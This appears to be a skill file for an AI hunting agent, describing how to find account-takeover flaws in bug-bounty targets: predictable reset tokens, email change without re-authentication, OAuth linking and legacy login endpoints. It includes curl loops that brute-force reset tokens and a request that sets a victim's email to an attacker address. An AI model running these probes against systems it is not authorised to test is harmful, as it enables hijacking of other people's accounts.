---
name: hunt-ato
description: Hunt Account Takeover (ATO) vulnerabilities — weak password reset tokens, email change without verification, session fixation, credential stuffing differentiated from rate-limited login, OAuth identity confusion, unverified account linking, legacy authentication left enabled after migration. Use when target has login/registration/password reset/OAuth flows.
sources: hackerone_public, github
report_count: 0
---

# HUNT-ATO — Account Takeover Hunting

## Crown Jewel Targets
- **Password reset token predictability** — numeric, timestamp-based, short
- **Email/SMS change without password confirmation**
- **OAuth account linking without verification** — link arbitrary provider to any account
- **Session fixation** — pre-set session ID accepted after login
- **Legacy auth left after migration** — old API still accepts password
- **Credential stuffing differentiated** — response differs between "user exists" and "wrong password"

## Phase 1 — Password Reset Analysis
```bash
# Reset token inspection
curl -s "https://$TARGET/api/reset/request" -d "email=test@test.com"
# Check email for token pattern: numeric, hex, JWT, UUID

# Test token predictability
for i in $(seq 1 100); do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://$TARGET/api/reset/verify?token=$i")
  [ "$STATUS" = "200" ] && echo "Token $i is valid!"
done
```

## Phase 2 — Email Change Verification Bypass
```bash
# Test if email change requires password confirmation
curl -s -X PUT "https://$TARGET/api/user/email" \
  -H "Content-Type: application/json" \
  -b "session=VALID_SESSION" \
  -d '{"email": "attacker@evil.com"}'
```

## Phase 3 — OAuth Account Linking
```bash
# Test OAuth linking without verifying ownership of existing account
# 1. Create account with OAuth (Google)
# 2. Link another OAuth provider (GitHub) without re-auth
# 3. If successful → possible to link arbitrary provider
```

## Phase 4 — Legacy Auth Bypass
```bash
# Old API endpoints often have weaker auth
for old_path in /v1/login /api/login /api/v1/auth /old/login /legacy/login; do
  curl -s -X POST "https://$TARGET$old_path" \
    -d "username=test&password=test"
done
```

## Related Skills
- **hunt-mfa-bypass** — MFA step can be the ATO defense
- **hunt-auth-bypass** — broader authentication flaws
- **triage-validation** — 7-Question Gate
